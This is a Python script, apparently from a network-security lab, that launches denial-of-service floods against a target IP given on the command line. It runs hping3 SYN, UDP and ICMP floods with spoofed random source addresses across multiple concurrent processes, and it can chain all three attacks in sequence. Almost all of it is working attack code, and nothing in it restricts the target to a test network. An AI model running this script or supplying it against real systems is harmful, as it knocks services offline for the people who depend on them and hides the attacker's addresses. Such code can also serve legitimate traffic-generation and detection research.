import os
import sys
from time import sleep

def launch_attack(attack_type, num_processes, duration_sec, target_ip):
    """
    Launches a specific type of DDoS attack directly from this machine.
    This does NOT use a virtual Mininet topology.
    """
    
    attack_commands = {
        'tcp': f"hping3 -S -V -p 80 --rand-source --flood {target_ip}",
        'udp': f"hping3 -2 -V --rand-source --flood {target_ip}",
        'icmp': f"hping3 -1 -V --rand-source --flood {target_ip}"
    }

    if attack_type not in attack_commands:
        print(f"Error: Invalid attack type '{attack_type}'.")
        return

    command = attack_commands[attack_type]
    
    print(f"\n--- Launching {attack_type.upper()} DDoS Attack ---")
    print(f"Target: {target_ip}")
    print(f"Attacker: This machine ({os.uname()[1]})")
    print(f"Number of Attack Processes: {num_processes}")
    print(f"Duration: {duration_sec} seconds")
    print(f"Executing command: {command}")
    print("------------------------------------------")

    # Launch multiple attack processes in the background
    for i in range(num_processes):
        # We use 'timeout' to ensure the commands stop after the specified duration.
        full_command = f"timeout {duration_sec}s {command} &"
        os.system(full_command)
        
    print(f"\nAttack in progress. Waiting for {duration_sec} seconds...")
    sleep(duration_sec + 2)

    os.system('killall hping3 > /dev/null 2>&1')
    print(f"\n--- {attack_type.upper()} Attack Finished ---")


if __name__ == '__main__':
    if len(sys.argv) != 5:
        print("\nUsage: sudo python LaunchAllAttacks.py <attack_type> <num_processes> <duration_sec> <target_ip>")
        print("  <attack_type>: tcp, udp, icmp, or 'all' to run all three in sequence")
        print("  <num_processes>: Number of concurrent attack processes to run (e.g., 5)")
        print("  <duration_sec>: Duration for EACH attack type in the sequence (e.g., 60)")
        print("  <target_ip>: e.g., 10.0.2.5\n")
        sys.exit(1)

    try:
        attack_name = sys.argv[1].lower()
        process_count = int(sys.argv[2])
        attack_duration = int(sys.argv[3])
        target = sys.argv[4]
        
        # --- NEW: Logic to handle the 'all' keyword ---
        if attack_name == 'all':
            print("====== LAUNCHING ALL ATTACKS IN SEQUENCE ======")
            
            # 1. TCP Attack
            launch_attack('tcp', process_count, attack_duration, target)
            print("\nPausing for 15 seconds before next attack stage...")
            sleep(15)
            
            # 2. UDP Attack
            launch_attack('udp', process_count, attack_duration, target)
            print("\nPausing for 15 seconds before next attack stage...")
            sleep(15)

            # 3. ICMP Attack
            launch_attack('icmp', process_count, attack_duration, target)

            print("\n====== ALL ATTACK STAGES COMPLETE ======")
            
        else:
            # This is the original logic for single attacks
            launch_attack(attack_name, process_count, attack_duration, target)
        
    except ValueError:
        print("Error: Please provide valid integers for num_processes and duration_sec.")
    except Exception as e:
        print(f"An error occurred: {e}")
